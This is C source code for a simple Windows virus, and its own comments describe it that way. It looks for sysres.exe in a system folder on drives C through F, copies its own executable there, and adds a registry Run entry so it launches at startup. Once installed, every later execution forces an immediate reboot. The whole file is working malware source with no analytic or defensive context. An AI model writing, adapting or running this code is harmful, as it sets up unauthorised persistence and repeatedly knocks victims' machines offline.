#include<stdio.h>
#include<dos.h>
#include<dir.h>

int found,drive_no;
char buff[128];

void findroot()
{
int done;
struct ffblk ffblk;//File block structure
done=findfirst("C:\\windows\\system",&ffblk,FA_DIREC); //to determine the root drive
if(done==0)
{
done=findfirst("C:\\windows\\system\\sysres.exe",&ffblk,0); //to determine whether the virus is already installed or not
if(done==0)
{
found=1; //means that the system is already infected
return;
}
drive_no=1;
return;
}

done=findfirst("D:\\windows\\system",&ffblk,FA_DIREC);
if(done==0)
{
done=findfirst("D:\\windows\\system\\sysres.exe",&ffblk,0);
if(done==0)
{
found=1;
return;
}
drive_no=2;
return;
}

done=findfirst("E:\\windows\\system",&ffblk,FA_DIREC);
if(done==0)
{
done=findfirst("E:\\windows\\system\\sysres.exe",&ffblk,0);
if(done==0)
{
found=1;
return;
}
drive_no=3;
return;
}

done=findfirst("F:\\windows\\system",&ffblk,FA_DIREC);
if(done==0)
{
done=findfirst("F:\\windows\\system\\sysres.exe",&ffblk,0);
if(done==0)
{
found=1;
return;
}
drive_no=4;
return;
}
else
exit(0);

}

void main()
{
FILE *self,*target;
findroot();
if(found==0) //if the system is not already infected
{
self=fopen(_argv[0],"rb"); //The virus file open's itself
switch(drive_no)
{
case 1:
target=fopen("C:\\windows\\system\\sysres.exe","wb");//to place a copy of itself in a remote place
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d C:\\windows\\system\\sysres.exe");//put this file to registry for starup
break;
case 2:
target=fopen("D:\\windows\\system\\sysres.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d D:\\windows\\system\\sysres.exe");
break;
case 3:
target=fopen("E:\\windows\\system\\sysres.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d E:\\windows\\system\\sysres.exe");
break;
case 4:
target=fopen("F:\\windows\\system\\sysres.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d F:\\windows\\system\\sysres.exe");
break;
default:
exit(0);
}
while(fread(buff,1,1,self)>0)
fwrite(buff,1,1,target);
fcloseall();
}
else
system("shutdown -r -t 0");//if the system is already infected then just give a command to restart
}